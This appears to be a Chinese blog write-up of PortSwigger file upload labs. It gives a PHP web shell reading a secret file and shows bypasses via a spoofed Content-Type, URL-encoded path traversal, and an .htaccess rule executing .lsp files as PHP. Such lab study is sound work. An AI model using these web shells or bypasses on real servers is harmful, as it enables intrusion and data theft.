---
title: PortSwigger-文件上传漏洞
date: 2025-12-09 17:31:31
categories:
  - 学习笔记
tags:
  - 文件上传漏洞
  - PortSwigger
index_img: /img/shen.png
banner_img: /img/default.png
---

## Lab1: Remote code execution via web shell upload
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774676470436.png)
登录所给的的账号，可以看到有个头像上传的地方
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774676810935.png)
按照实验所给的，我们只要输出`/home/carlos/secret`的内容即可
那么编写php 文件,第一个实验没有任何过滤
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
// file_get_contents() 把整个文件读入一个字符串中
```
返回去在burp就可以看到相关位置
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774677167880.png)
或者通过`F12`获取图片元素也能找到路径
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774677238498.png)
点击 `submit solution` 并提交


## Lab2: Web shell upload via Content-Type restriction bypass
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774677607963.png)
先登录上传`php`文件，但从实验描述来看应该行不通
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774678205810.png)
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774678287915.png)
去`burp`查看相关的包,发到重发器
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774678404102.png)
尝试修改`Content-Type`绕过
```
Content-Type: image/png
```
好的，成功
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774678617788.png)
回到浏览器刷新一下，在`burp`的`http`记录里找到相关包

![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774678734166.png)
这个位置提交
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774678773961.png)



## Lab3: Web shell upload via path traversal
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774678859662.png)
实验提示路径遍历,还是先登录下把`php`文件上传上去
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774679269484.png)
成功上传，返回去通过浏览器F12对图片元素进行定位找到上传的路径
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774679365105.png)
访问下代码并没有被执行
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774679422966.png)
根据实验提示我们通过`../`来尝试能不能修改文件的上传路径
在`burp`找到相关的包,发到重发器
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774679637463.png)
尝试修改`filename`，但并没有成功
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774679861119.png)
尝试对其`URL`编码
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774680014124.png)
似乎成功了
正常来说上传的文件一个放在`/files/avatars/shell.php`
既然用了`../`那就是回到上一级的目录,那就是`/files/shell.php`
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774680284990.png)
去主页 `submit solution` 提交


## Lab4: Web shell upload via extension blacklist bypass
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774680469130.png)
- 一个经典的` Apache` 服务器配置文件覆盖导致的绕过漏洞
- 这个漏洞利用的核心原理可以总结为一句话：利用服务器允许上传 `.htaccess` 文件的疏忽，动态修改了该目录下的文件解析规则，从而让一个不在黑名单里的自定义后缀名（如 `.lsp`）被当作` php` 代码执行
- 实验室的初始防御机制是黑名单。服务器会检查上传文件的扩展名，如果发现是 `.php` 等已知的危险后缀，就会拒绝上传。
- 缺陷所在： 黑名单只能防御“已知”的威胁。如果攻击者能发明一种全新的后缀，而这种后缀又不在黑名单里，服务器就会放行

### 第一步上传：修改解析规则

在解决方案中，第一步是抓包并修改参数，上传了一个名为 `.htaccess` 的文件

- **文件内容：** `AddType application/x-httpd-php .lsp`
    
- **原理作用：** 这是一条 Apache 指令（利用了 `mod_mime` 模块）。意思是告诉 Apache 服务器：“在这个目录下，如果遇到任何以 `.lsp` 为后缀的文件，请将它的 MIME 类型视为 `application/x-httpd-php`，并将其交给 PHP 解释器（`mod_php`）去执行”
    
- **结果：** 攻击者人为地在服务器上创造了一个新的“可执行 `php` 后缀”

### 第二步上传：绕过黑名单的 WebShell

接下来，上传真正的木马文件。

- **文件名：** `shell.lsp`
    
- **文件内容：** `<?php echo file_get_contents('/home/carlos/secret'); ?>`
    
- **原理作用：** 由于 `.lsp` 只是一个毫无意义的自定义字符串，它绝对不可能出现在开发人员编写的黑名单中（黑名单通常只拦截 `.php`, `.php5`, `.phtml` 等）。因此，这个文件被服务器视为“安全”的普通文件，成功保存到了头像目录下

###  触发执行与完成利用

- 当攻击者通过浏览器发送 `GET /files/avatars/exploit.lsp` 请求时，Apache 服务器接收到了请求
    
- Apache 查看该目录下的规则，发现了刚刚上传的 `.htaccess` 文件
    
- 根据 `.htaccess` 中的规则，Apache 将 `exploit.lsp` 识别为` php` 文件，并将其内容交给后端的 PHP 引擎解析
    
- PHP 代码成功执行，读取了系统根目录下的 `secret` 文件并将其内容返回在 `http` 响应报文中

下面实战

先编写两个文件`.htaccess`和`shell.lsp`，内容：
```
AddType application/x-httpd-php .lsp
```
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
登录实验室的账号，先把`.htaccess`上传上去
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774681581636.png)
接着是`shell.lsp`
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774681623907.png)
访问`/files/avatars/shell.lsp`
![](/img/PortSwigger-文件上传漏洞/PortSwigger-文件上传漏洞-1774681703090.png)
成功得到内容，提交到主页 `submit solution`



## Lab5: Web shell upload via obfuscated file extension


